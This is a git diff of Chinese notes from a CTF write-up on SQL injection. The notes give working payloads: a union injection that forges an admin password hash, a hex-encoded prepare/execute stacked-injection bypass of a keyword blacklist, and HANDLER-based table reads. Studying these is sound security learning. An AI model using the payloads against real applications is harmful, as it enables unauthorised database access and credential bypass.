@@ -38,9 +38,49 @@ if($arr[1] == "admin"){
    这里就是我们伪造了最后一条记录上去了，同样这里题目我们也可以伪造一条admin账户的查询结果，混淆正确密码，但是这个md5加密一下我是真的想不到，不过也算是契合实际吧，算是经验了。
 5. payload：
 ```http
-   name=admi'union select 1,'admin','202cb962ac59075b964b07152d234b70'--+&pw=123
-```
-这里是123的md5加密，就是伪造了一个admin的密码，然后密码输入123就好了。
-# [GYCTF2020]Blacklist
+?name=admi'union select 1,'admin','202cb962ac59075b964b07152d234b70'--+&pw=123
 
-   
+# 这里'202cb962ac59075b964b07152d234b70'是'123'的md5加密，
+```
+就是伪造了一个admin的密码，然后密码输入123就好了。
+# [GYCTF2020]Blacklist
+sql注入
+过滤了；
+```php
+return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
+```
+   因为过滤了select所以要绕一下，绕过select的方法我知道的有三中，回顾一下：
+   1. 预处理语句
+就是用16进制字符串的形式把sql语句预处理之后再调用，就像这样
+```http
+?inject=-1';SeT@a=73656c656374202a2066726f6d20466c616748657265;prepare execsql from @a;execute execsql;#
+
+# 这里'73656c656374202a2066726f6d20466c616748657265'是16进制的'select * from FlagHere'
+```
+但是这样就需要用到`prepare`，`execsql`，`execute`，`set`等关键字，这里还是被过滤了
+2. 改表
+这个适用页面可以直接查询其他表的时候，我们可以把我们需要的表改为页面查询的表，这样就可以直接查，但是这里并不适用
+3. hadler语句代替select
+这个方法也是一种查询方法，可以一行行查询
+```sql
+handler '表名' open;  /  handler '表名' open as '别名'; --打开
+handler '表名' read first;  --读取第一行
+handler '表名' read next;  --读取下一行（要先读取第一行）
+
+--还可以：
+handler '表名' read first/next limit 10；--显示下面10行或者从开始数的10行
+
+handler '表名' close；  --释放空间
+```
+
+所以我们这里可以用hadler语法查询
+首先我们通过堆叠注入查询一下表：
+```http
+?inject=1'show+tables;--+
+```
+![500](assets/Day%205/file-20251223140522438.png)
+这里就确定了表名，接下来就用hadler直接查询:
+```http
+?inject=1';handler+FlagHere+open+as+a;handler+a+read+first--+
+```
+![500](assets/Day%205/file-20251223140422361.png)
